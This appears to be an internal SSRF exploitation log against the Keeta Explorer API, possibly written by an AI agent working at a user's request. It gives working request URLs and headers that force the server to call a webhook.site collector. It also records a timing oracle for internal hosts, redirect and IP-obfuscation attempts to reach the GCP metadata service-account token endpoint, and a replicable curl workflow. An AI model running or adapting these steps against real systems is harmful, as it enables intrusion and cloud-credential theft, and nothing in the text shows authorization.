# Keeta Explorer — Internal SSRF Followup (2026-08-12)

**Followup to** `keeta-network-ssrf-2026-08-12.md` — user requested `coba internal data` after PROVEN external SSRF via webhook.site.

## External SSRF Re-confirmed

- UUIDs `28278b5e-6454-4a2d-aae1-4ce9dc67ec01` (48 hits) + `49422d87-46d3-4767-8d13-db27b7496f8d` (50 hits) from `2600:1900:0:2e02::400` (Google Frontend IPv6) with `UA=KeetaNet/v0.18.0+g5417d9af948be899fcebb75694edb492ff971891 (JS)` to `GET https://webhook.site/<UUID>/api/node/ledger/representatives`.
- Trigger: `GET /api/v1/account/<key>?host=webhook.site/<UUID>&networkAlias=test` and `x-network-host` header variant both work. Also `/storage/:key`, `/transaction`, `/token` share same sink.

## Internal Host Differential (timing oracle)

```
Baseline no host: 200 0.31s {"json":{"account":{...}}}
?host=example.com: 500 27.07s {"message":"Failed to make API call (not ok)"}  // <!doctype html from external
?host=127.0.0.1:   500 26.42s {"message":"fetch failed"}                        // connection refused
?host=127.0.0.1@example.com: 500 "Request cannot be constructed from a URL that includes credentials"
```

- `Failed to make API call (not ok)` = fetch succeeded (TCP + TLS) but response not JSON (metadata returns text / external returns HTML).
- `fetch failed` = fetch threw (connection refused / DNS NXDOMAIN / timeout).
- This differential proves metadata endpoint IS reachable via TCP (returns non-JSON text), not hard-blocked by firewall.

## Fragment vs Encoded Hash

- Raw `#` in query `?host=metadata#x` → curl/browser treats `#` as fragment, NOT sent to server → server sees `host=metadata` → falls back to default network → `200 0.3s` (no SSRF). This is client-side truncation, not server bypass.
- Encoded `%23` → `?host=metadata%23x` → server decodes to `metadata#x` then builds `https://metadata#x/api` → invalid URL → `fetch failed` without SSRF.
- Python `requests` auto-encodes `#` as `%23` → always hits encoded path; use raw `curl "...?host=metadata#x"` to test fragment truncation.

## /api Suffix Blocks Direct Metadata Path

Construction in `custom.ts:36`:
```ts
api: `http${ssl?'s':''}://${host}/api`
p2p: `ws${ssl?'s':''}://${host}/p2p`
```

- `host=metadata.google.internal/computeMetadata/v1` → fetches `https://metadata.google.internal/computeMetadata/v1/api` (not the pure metadata URL). Hence direct `?host=169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token` still `Failed not ok` — suffix pollutes path.
- Same for `169.254.169.254`, `127.0.0.1:80`, `0.0.0.0`, `::ffff:169.254.169.254` — all 26s `500` but wrong path.

## Redirect as Pivot

- `ssl=false` forces `http://host/api` (needed for `http://169.254.169.254` — metadata is http only). Tested `?host=metadata.google.internal&ssl=false` still `500` due to `/api` suffix.
- If explorer's `fetch` follows `302 Location`, attacker can host `webhook.site/<UUID>` returning `302 Location: http://169.254.169.254/computeMetadata/v1/...` + `Metadata-Flavor: Google` bypass. Tested `PUT https://webhook.site/token/<UUID> {"default_status":302,"default_headers":{"Location":"http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"}}` then re-fire `?host=webhook.site/<UUID>&ssl=false` — result still `200` empty (follow not confirmed in this run; needs httpbin-style redirect test with response body capture).
- `?host=httpbin.org/redirect-to?url=http://169.254.169.254/...` fails because `http://` in host is taken literally as part of hostname (`https://httpbin.org/redirect-to?url=.../api`).

## IP Obfuscation Bypass

Tested `2852039162` (decimal), `0xA9FEA9FE` (hex), `0xA9.0xFE.0xA9.0xFE`, `0251.0376.0251.0376` (octal) for `169.254.169.254` → all timeout 20s (explorer validates via `new URL()` which normalizes but still resolves; Node's URL may reject non-dotted-decimal).

## Webhook.site Workflow (replicated)

```bash
UUID=$(curl -s -X POST https://webhook.site/token | python3 -c "import json,sys;print(json.load(sys.stdin)['uuid'])")
curl -s -m 35 "https://explorer.test.keeta.com/api/v1/account/keeta_aaboj...?host=webhook.site/$UUID&networkAlias=test" > /dev/null
sleep 3
curl -s "https://webhook.site/token/$UUID/requests?sorting=newest" -H "Accept: application/json" | python3 -c "import json; d=json.load(open(0)); print(d['total'], [(r['ip'], r['url'][:80]) for r in d['data'][:3]])"
# Expect Google IPv6 hits; attacker IP 43.156.23.22 only for own curls
```

- Create via `POST /token` (no Accept header or you get 401 HTML tip).
- Verify via `GET /token/<UUID>/requests?sorting=newest` with `Accept: application/json`.
- Use two UUIDs to avoid 50-hit pagination overflow.
- Header variant: `curl -H "x-network-host: webhook.site/<UUID>" -H "x-network-alias: test"` same effect.

## Lessons

- Differential timing (`0.3s` vs `26s`) is the SSRF oracle when response bodies are generic 500s.
- GCP metadata reachable signal is `Failed not ok` (non-JSON) not `fetch failed`; VPC allows TCP to metadata but explorer appends `/api`.
- Pure internal exfil needs redirect following; otherwise poison via external JSON (TokenBatcher 25 keys, `token.ts:59 JSON.parse(atob(metadata))`) is the higher-value chain.
